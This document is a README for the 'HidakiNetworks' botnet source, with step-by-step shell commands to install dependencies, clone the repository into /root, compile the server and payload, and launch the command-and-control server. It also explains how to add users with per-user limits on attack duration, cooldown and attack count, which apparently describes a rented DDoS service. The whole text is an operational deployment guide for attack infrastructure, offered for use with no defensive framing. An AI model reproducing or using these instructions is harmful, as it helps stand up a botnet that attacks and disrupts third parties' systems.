# HidakiNetworks
this is a source of [HidakiNetworks](https://t.me/hidakiteam) botnet\
Tested on Debian 10, 11 and Ubuntu 18.04, 20.04

## Installing
Guide for Ubuntu/Debian\
**Installing dependencies**
```bash
apt update && apt upgrade -y
apt install libbz2-1.0 libc6 liblzma5 perl zlib1g bzip2 python2 -y
apt install deltarpm -y
apt install nano screen gcc wget libzip-dev unzip git apache2 -y
```

**Copy sources**\
You must put sources into the /root directory!!
```bash
cd /root
git clone https://github.com/shittzuka/hidaki.git
mv hidaki/* /root
rm README.md
```

**Building sources**
```bash
gcc server.c -o srv -pthread
python2 compile.py
```

**Starting cnc**
```bash
chmod 777 *
screen ./srv 4258 1 <cnc port here>
```

## Adding users
For adding user, you must add a string in users/login.txt.\
NAME PASS GROUP MAX_ATTACK_TIME COOLDOWN MAX_ATTACK_COUNT EXPIRE_DATE\
Example: root shittzukamygpd 9999 3 10 99/99/9999

## Credits
[HidakiTeam](https://t.me/hidakiteam) - Created botnet\
[sh!ttzuka](https://t.me/tnkwa) - Added sources on Git ;D